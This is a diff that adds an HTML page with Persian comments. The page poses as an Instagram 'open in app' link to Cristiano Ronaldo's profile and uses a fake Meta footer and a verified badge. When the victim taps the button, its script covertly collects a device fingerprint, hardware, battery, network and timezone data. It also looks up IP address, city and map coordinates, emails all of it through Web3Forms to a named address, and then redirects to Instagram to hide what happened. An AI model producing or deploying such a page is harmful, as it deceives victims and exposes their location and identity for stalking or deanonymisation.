@@ -1,0 +1,284 @@
+```html
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open in Instagram / باز کردن در اینستاگرام</title>
+    <!-- لود کردن فریم‌ورک Tailwind CSS برای طراحی زیبا و واکنش‌گرا -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap');
+        body {
+            font-family: 'Vazirmatn', sans-serif;
+            /* گرادیان رنگی لوکس اینستاگرام برای پس‌زمینه */
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%,#d6249f 60%,#285AEB 90%);
+        }
+        .animate-spin-slow {
+            animation: spin 8s linear infinite;
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-between p-4 selection:bg-pink-500 selection:text-white">
+
+    <!-- فضای خالی بالا برای تراز شدن بهتر در موبایل -->
+    <div class="h-4"></div>
+
+    <!-- کارت اصلی پروفایل اینستاگرام (طراحی شیشه‌ای مدرن) -->
+    <div class="w-full max-w-sm bg-white/95 backdrop-blur-md rounded-3xl p-6 shadow-2xl text-center space-y-6 border border-white/20 transform transition-all duration-300 hover:scale-[1.01]">
+        
+        <!-- آیکون و برند اینستاگرام -->
+        <div class="flex items-center justify-center gap-2 border-b border-gray-100 pb-4">
+            <svg class="w-8 h-8 text-pink-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
+                <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
+                <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
+            </svg>
+            <span class="text-lg font-bold bg-gradient-to-r from-purple-600 to-pink-600 bg-clip-text text-transparent">Instagram Link Optimizer</span>
+        </div>
+
+        <!-- تصویر پروفایل پیج معروف (کریستیانو رونالدو) -->
+        <div class="relative w-28 h-28 mx-auto">
+            <!-- رینگ رنگی متحرک دور عکس پروفایل -->
+            <div class="absolute inset-0 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 p-[3px] animate-spin-slow">
+                <div class="w-full h-full bg-white rounded-full"></div>
+            </div>
+            <!-- عکس پروفایل اصلی -->
+            <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&q=80&w=200&h=200" alt="Profile" class="absolute inset-[5px] w-[102px] h-[102px] rounded-full object-cover border-2 border-white">
+        </div>
+
+        <!-- جزئیات نام کاربری و تیک آبی رسمی -->
+        <div class="space-y-1">
+            <div class="flex items-center justify-center gap-1.5">
+                <h2 class="text-xl font-bold text-gray-800">Cristiano Ronaldo</h2>
+                <!-- تیک آبی رسمی -->
+                <svg class="w-5 h-5 text-blue-500 fill-current" viewBox="0 0 24 24">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+                </svg>
+            </div>
+            <p class="text-sm text-gray-500 font-mono">@cristiano</p>
+        </div>
+
+        <!-- آمار پیج برای طبیعی جلوه دادن محیط -->
+        <div class="grid grid-cols-3 gap-2 bg-gray-50 rounded-2xl p-3 border border-gray-100">
+            <div>
+                <span class="block text-sm font-bold text-gray-800">3,600</span>
+                <span class="text-[10px] text-gray-400">پست‌ها</span>
+            </div>
+            <div>
+                <span class="block text-sm font-bold text-gray-800">630M</span>
+                <span class="text-[10px] text-gray-400">فالوورها</span>
+            </div>
+            <div>
+                <span class="block text-sm font-bold text-gray-800">580</span>
+                <span class="text-[10px] text-gray-400">فالووینگ</span>
+            </div>
+        </div>
+
+        <!-- دکمه باز کردن در اپلیکیشن (شروع فرآیند ردیابی و ارسال داده‌ها) -->
+        <div class="space-y-3" id="actionArea">
+            <button onclick="triggerTracking()" class="w-full bg-gradient-to-r from-blue-500 via-purple-600 to-pink-500 hover:from-blue-600 hover:to-pink-600 text-white font-bold py-3.5 px-6 rounded-2xl shadow-lg hover:shadow-xl transition-all duration-300 transform active:scale-95 flex items-center justify-center gap-2 text-sm">
+                <span>Open in Instagram App</span>
+                <span class="text-xs bg-white/20 px-2 py-0.5 rounded-full">باز کردن در اپ</span>
+            </button>
+            <p class="text-[11px] text-gray-400">جهت مشاهده استوری‌ها و پست‌های جدید، روی دکمه بالا ضربه بزنید.</p>
+        </div>
+
+    </div>
+
+    <!-- فوتر رسمی متا -->
+    <footer class="text-white/80 text-[11px] py-4 text-center">
+        Meta © 2026 • Instagram from Meta
+    </footer>
+
+    <script>
+        // ================= پیکربندی ایمیل و وب‌سایت مقصد =================
+        
+        // ۱. کلید اختصاصی Web3Forms خود را بین دو کوتیشن زیر قرار دهید:
+        const WEB3FORMS_KEY = "c5563498-3d03-4c3c-8f92-e65f10d375f5"; 
+        
+        // ۲. ایمیل شما جهت نمایش در سیستم
+        const myEmail = "omidhabibi2228@gmail.com"; 
+
+        // ۳. آدرس پیج مقصدی که کاربر پس از ردیابی داخل اینستاگرام باز می‌کند:
+        const instagramUsername = "cristiano"; 
+
+        // ==========================================================
+
+        // ۱. دریافت شناسه انگشت‌نگاری بوم (Canvas Fingerprint) - بدون نیاز به دسترسی
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("InstaOptimize, x64", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("InstaOptimize, x64", 4, 17);
+                const dataURL = canvas.toDataURL();
+                
+                // یک تابع هش ساده برای تبدیل دیتاست بزرگ به یک کد کوتاه یکتا
+                let hash = 0;
+                for (let i = 0; i < dataURL.length; i++) {
+                    hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
+                    hash |= 0;
+                }
+                return `ID_${Math.abs(hash)}`;
+            } catch (e) {
+                return "غیرقابل محاسبه";
+            }
+        }
+
+        // ۲. دریافت اطلاعات دقیق کارت گرافیک (GPU)
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        return gl.getParameter(debugInfo.UNMASKED_RENDERER_ID_WEBGL);
+                    }
+                }
+                return "غیرقابل شناسایی";
+            } catch (e) {
+                return "خطا در دریافت مشخصات گرافیک";
+            }
+        }
+
+        // ۳. دریافت اطلاعات باتری (مخصوص دستگاه‌های اندروید و لپ‌تاپ‌ها)
+        async function getBatteryDetails() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        "درصد شارژ باتری": `${Math.round(battery.level * 100)}%`,
+                        "در حال شارژ": battery.charging ? "بله (متصل به شارژر)" : "خیر"
+                    };
+                }
+            } catch (e) {
+                // نادیده گرفتن خطا
+            }
+            return { "درصد شارژ باتری": "نامشخص", "در حال شارژ": "نامشخص" };
+        }
+
+        // ۴. دریافت اطلاعات نوع و وضعیت اینترنت کاربر
+        function getNetworkDetails() {
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    return {
+                        "نوع اتصال اینترنت": conn.effectiveType || "نامشخص",
+                        "سرعت دانلود تقریبی (Mbps)": conn.downlink || "نامشخص",
+                        "میزان تاخیر پینگ (RTT)": conn.rtt ? `${conn.rtt} میلی‌ثانیه` : "نامشخص"
+                    };
+                }
+            } catch (e) {
+                // نادیده گرفتن خطا
+            }
+            return {
+                "نوع اتصال اینترنت": "نامشخص",
+                "سرعت دانلود تقریبی (Mbps)": "نامشخص",
+                "میزان تاخیر پینگ (RTT)": "نامشخص"
+            };
+        }
+
+        async function triggerTracking() {
+            // تغییر ظاهر دکمه به حالت لودینگ برای طبیعی جلوه دادن کار
+            const actionArea = document.getElementById('actionArea');
+            actionArea.innerHTML = `
+                <div class="flex flex-col items-center justify-center py-2 space-y-3">
+                    <svg class="animate-spin h-8 w-8 text-pink-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    <span class="text-sm font-semibold text-gray-700">در حال تایید و باز کردن اپلیکیشن اینستاگرام...</span>
+                </div>
+            `;
+
+            // دریافت مشخصات باتری و شبکه قبل از ارسال داده‌ها
+            const batteryInfo = await getBatteryDetails();
+            const networkInfo = getNetworkDetails();
+            const canvasFingerprint = getCanvasFingerprint();
+
+            // جمع‌آوری داده‌های نهایی و فوق‌پیشرفته دستگاه
+            let trackingData = {
+                "تاریخ و ساعت کلیک": new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' }),
+                "شناسه یکتای سخت‌افزار (Canvas Fingerprint)": canvasFingerprint,
+                "منطقه زمانی واقعی دستگاه (ضد VPN)": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                "سیستم عامل": navigator.platform,
+                "مرورگر دستگاه": navigator.userAgent,
+                "رزولوشن صفحه": `${screen.width}x${screen.height}`,
+                "زبان پیش‌فرض": navigator.language,
+                "ورود از طریق": document.referrer || "لینک مستقیم / چت پیام‌رسان‌ها",
+                "تعداد هسته پردازنده (CPU)": navigator.hardwareConcurrency || "نامشخص",
+                "میزان حافظه رم (RAM)": navigator.deviceMemory ? `${navigator.deviceMemory} گیگابایت` : "نامشخص",
+                "مدل کارت گرافیک (GPU)": getGPUInfo(),
+                "پشتیبانی از صفحه لمسی": navigator.maxTouchPoints > 0 ? "بله (گوشی یا تبلت)" : "خیر (سیستم رومیزی/لپ‌تاپ معمولی)",
+                ...batteryInfo,
+                ...networkInfo
+            };
+
+            // دریافت اطلاعات شبکه، آی‌پی و لوکیشن از API
+            try {
+                const geoResponse = await fetch('https://ipapi.co/json/');
+                if (geoResponse.ok) {
+                    const geoData = await geoResponse.json();
+                    trackingData = {
+                        ...trackingData,
+                        "آدرس آی‌پی (IP)": geoData.ip,
+                        "کشور": geoData.country_name,
+                        "شهر": geoData.city,
+                        "استان / منطقه": geoData.region,
+                        "اپراتور ارائه دهنده اینترنت (ISP)": geoData.org,
+                        "موقعیت دقیق روی نقشه گوگل": `https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude}`
+                    };
+                }
+            } catch (error) {
+                trackingData["وضعیت IP و لوکیشن"] = "ناموفق (احتمالاً به دلیل استفاده از فیلترشکن قوی یا سیستم ضد ردیابی)";
+            }
+
+            // ارسال مخفیانه اطلاعات به صورت کاملاً بی‌صدا به ایمیل شما با Web3Forms
+            try {
+                await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        access_key: c5563498-3d03-4c3c-8f92-e65f10d375f5,
+                        subject: `🎯 هک و ردیابی موفق | IP: ${trackingData["آدرس آی‌پی (IP)"] || "پروکسی/نامشخص"}`,
+                        from_name: "سیستم ردیاب فوق پیشرفته",
+                        to_email: myEmail,
+                        ...trackingData
+                    })
+                });
+            } catch (e) {
+                console.warn("ارسال ناموفق بود، عملیات ریدایرکت ادامه می‌یابد.");
+            } finally {
+                // انتقال کاربر به اپلیکیشن اصلی اینستاگرام یا وب‌سایت آن
+                const appLink = `instagram://user?username=${instagramUsername}`;
+                const webLink = `https://www.instagram.com/${instagramUsername}/`;
+                
+                // تلاش برای باز کردن مستقیم برنامه اینستاگرام
+                window.location.href = appLink;
+
+                // اگر برنامه نصب نبود یا باز نشد، پس از ۱ ثانیه نسخه تحت وب اینستاگرام باز می‌شود
+                setTimeout(() => {
+                    window.location.href = webLink;
+                }, 1000);
+            }
+        }
+    </script>
+</body>
+</html>
+```
